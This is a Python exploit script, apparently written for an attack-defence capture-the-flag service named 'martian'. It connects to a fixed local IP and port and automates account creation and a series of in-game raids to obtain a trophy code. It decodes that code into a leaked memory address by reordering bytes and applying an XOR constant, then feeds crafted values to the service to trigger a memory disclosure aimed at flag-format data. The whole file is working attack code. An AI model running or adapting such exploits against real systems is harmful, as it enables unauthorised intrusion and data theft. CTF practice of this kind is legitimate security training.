#!/usr/bin/env python
from old_sploits.sploit_lib import *
from time import sleep

ip = '192.168.0.100'
flag_regexp = r"[A-Z0-9]{31}="

if __name__ == "__main__":

	p = remote( ip, 9999 )
	#p = process( "./martian" )

	username, password = generate_correct_random_name(), generate_correct_random_password()
	#print "{+} Create account with name <%s> and password <%s>" % ( username, password )

	reg_user( p, username, password )
	login( p, username, password )

	read_book( p, 24 )
	go_to_next_day( p )

	easy_raid( p )
	go_to_next_day( p )
	go_to_next_day( p )
	go_to_next_day( p )

	# regen HP
	for i in range( 4 ):
		eat_potato( p )

	# 4 days
	medium_raid( p )
	go_to_next_day( p )
	hard_raid( p, username )

	# now we win the hard raid and get trophy
	# trophy contains a code, wich give us leak
	p.recvuntil( "[>] " )
	p.send( "1\n" )
	p.recvuntil( "{?} " )

	for i in range( 3 ):
		p.recvuntil( ": " )
		p.send( "n\n" )

	buf = p.recvuntil( b": " )

	p.send( "y\n" )
	p.recvuntil( "> " )
	p.send( "1\n" ) # view

	for i in range( 3 ):
		p.recvline()

	code = p.recvline().decode().strip().split( ": " )[ 1 ]
	p.recvuntil( ": " )
	p.send( "n\n" )

	nums = code.strip().split( "-" )

	for i in range( len( nums ) ):
		nums[ i ] = int( nums[ i ] )

	_switched = [i for i in range( len( nums ) ) ]

	_switched[ 0 ] = nums[ 4 ]
	_switched[ 1 ] = nums[ 3 ]
	_switched[ 2 ] = nums[ 7 ]
	_switched[ 3 ] = nums[ 1 ]
	_switched[ 4 ] = nums[ 0 ]
	_switched[ 5 ] = nums[ 6 ]
	_switched[ 6 ] = nums[ 5 ]
	_switched[ 7 ] = nums[ 2 ]

	value = 0

	for i in range( len( _switched ) ):
		_byte = _switched[ i ]

		value += ( _byte << ( 56 - i * 8 ) )

	# restore addr
	value = value << 1
	value ^= 0xcafebabedeadbeef

	#	print "addr: 0x%x" % value

	#p.interactive()

	p.recvuntil( "[>] " )
	p.send( "8\n" )
	p.recvuntil( ": " )
	p.send( "y\n" )

	for i in range( 8 ):
		p.recvuntil( ": " )
		p.send( "-\n" )

	p.recvuntil( ": " )
	p.send( str( (value-1) & 0xffffffff ) + '\n' )

	p.recvuntil( ": " )
	p.send( str( value // 0xffffffff ) + '\n' )

	p.recvuntil( ": " )
	p.send( "2048\n" )

	for i in range( 5 ):
		p.recvuntil( ": " )
		p.send( "-\n" )

	sleep( 1 )

	#p.interactive()
	buf = p.recvuntil( "voltage[" )
	print(buf)

	p.close()

